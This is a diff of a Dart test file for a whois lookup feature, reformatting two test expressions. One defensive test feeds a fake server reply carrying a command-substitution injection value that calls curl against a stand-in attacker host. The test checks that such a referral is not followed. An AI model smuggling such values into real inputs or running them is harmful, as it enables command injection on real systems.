@@ -498,7 +498,10 @@ void main() {
       vm.whoisTarget = 'example.com';
       await vm.runWhois();
 
-      expect(whois.asked, [('whois.iana.org', 'example.com'), ('whois.verisign-grs.com', 'example.com')]);
+      expect(whois.asked, [
+        ('whois.iana.org', 'example.com'),
+        ('whois.verisign-grs.com', 'example.com'),
+      ]);
       // Both replies are kept: the registry says who holds the delegation, the registrar says who
       // registered it, and dropping either loses a different fact.
       expect(vm.whoisResult, contains('domain: COM'));
@@ -531,7 +534,11 @@ void main() {
 
     test('a referral that is not a hostname is not followed', () async {
       // The referral is free text from a remote server and decides what this app connects to next.
-      final whois = FakeWhois({'whois.iana.org': r'refer: $(curl evil.example)' '\n'});
+      final whois = FakeWhois({
+        'whois.iana.org':
+            r'refer: $(curl evil.example)'
+            '\n',
+      });
       final vm = await boot(FakeProbe(), whois: whois);
       vm.whoisTarget = 'example.com';
       await vm.runWhois();
